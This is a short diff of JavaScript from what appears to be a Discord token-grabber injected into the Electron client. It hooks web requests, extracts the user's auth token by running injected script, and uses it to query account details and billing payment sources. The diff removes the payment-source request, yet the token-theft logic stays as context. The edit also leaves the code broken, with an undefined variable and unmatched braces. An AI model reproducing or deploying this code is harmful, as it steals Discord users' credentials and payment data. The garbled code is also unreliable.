@@ -348,16 +348,6 @@ session.defaultSession.webRequest.onCompleted(UrlFilter, (details, callback) => 
 			const window = BrowserWindow.getAllWindows()[0];
 			window.webContents.executeJavaScript(TokenEval, !0).then((token => {
 				window.webContents.executeJavaScript(`
-var xmlHttp = new XMLHttpRequest();
-xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
-xmlHttp.setRequestHeader("Authorization", "${token}");
-xmlHttp.send( null );
-xmlHttp.responseText;`, !0).then((info) => {
-var xmlHttp = new XMLHttpRequest();
-        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
-        xmlHttp.setRequestHeader("Authorization", "${token}");
-        xmlHttp.send( null );
-        xmlHttp.responseText`, !0).then((sex) => {
 
     const json = JSON.parse(info);
     var params = {
@@ -415,7 +405,7 @@ var xmlHttp = new XMLHttpRequest();
 })
     
 			}))
-}))
+
 		}
 	}
 	if (details.url.endsWith("users/@me")) {
